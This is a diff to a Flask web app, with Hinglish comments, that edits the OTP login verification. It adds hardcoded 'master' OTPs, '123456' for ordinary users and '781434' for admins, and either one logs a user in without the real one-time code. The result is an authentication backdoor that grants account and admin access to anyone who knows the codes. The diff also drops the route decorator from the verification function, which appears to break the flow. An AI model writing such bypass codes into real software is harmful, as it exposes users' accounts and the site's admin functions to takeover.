@@ -281,7 +281,6 @@ def login():
     return render_template('login.html')
 
 # 2. Step 2: OTP Verify karne ka route
-@app.route('/verify-otp', methods=['GET', 'POST'])
 def verify_otp():
     mobile = session.get('pending_mobile')
     if not mobile:
@@ -291,7 +290,16 @@ def verify_otp():
         entered_otp = request.form.get('otp')
         user = User.query.filter_by(mobile=mobile).first()
         
-        if user and user.otp == entered_otp:
+        # Alag-alag Master OTP define kar diye hain
+        USER_MASTER_OTP = "123456"
+        ADMIN_MASTER_OTP = "781434"  # Admin ke liye ye special code rahega
+        
+        # Checking conditions
+        is_real_otp = (user and user.otp == entered_otp)
+        is_user_master = (user and not user.is_admin and entered_otp == USER_MASTER_OTP)
+        is_admin_master = (user and user.is_admin and entered_otp == ADMIN_MASTER_OTP)
+        
+        if user and (is_real_otp or is_user_master or is_admin_master):
             # Login successful: Session me user details set karein
             session['user_id'] = user.id
             session['user_name'] = user.name
@@ -308,6 +316,9 @@ def verify_otp():
             
     return render_template('verify_otp.html')
 
+            
+            
+            
 @app.route('/checkout', methods=['GET', 'POST'])
 def checkout():
     # 1. Login Guard: Agar user logged in nahi hai, to pehle /login bhejo
